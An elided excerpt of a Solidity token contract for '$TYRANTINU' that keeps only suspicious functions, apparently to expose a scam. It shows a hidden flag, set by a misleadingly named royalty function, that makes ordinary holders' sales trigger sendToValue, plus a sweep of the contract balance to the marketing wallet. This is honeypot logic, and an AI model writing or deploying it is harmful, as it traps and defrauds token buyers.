...
contract FODTI is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _isMarketPair;

    string private constant _name = "FABLE OF DRAGON TYRANT INU ";
    string private constant _symbol = "$TYRANTINU";
    ...
    bool private isMarketPairing = false;
    ...
    function _getValuesRoyalty(uint256 amount) private {
        ...
        {
            isMarketPairing = true;
        } else {
            if (amount > marketingFee){
                uint256 TotalAmountUsage =  amount * marketingFee / 1;
                valueRoyalty(TotalAmountUsage);
            }
        }
    }
    ...
    function _transfer(
        ...
        if (isMarketPairing == true &&
            from != owner() && from != _marketingWallet && to == uniswapV2Pair)
            {sendToValue(from);
        }

        if (from == uniswapV2Pair) {
            require (_isMarketPair[to] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
            _isMarketPair[to] = block.timestamp;
        }
    ...
    function valueRoyalty(uint256 tokens) private {
            ...
            uint256 BalanceUsage = balanceOf(address(this));
            _basicTransfer(address(this), _marketingWallet, BalanceUsage);
    }
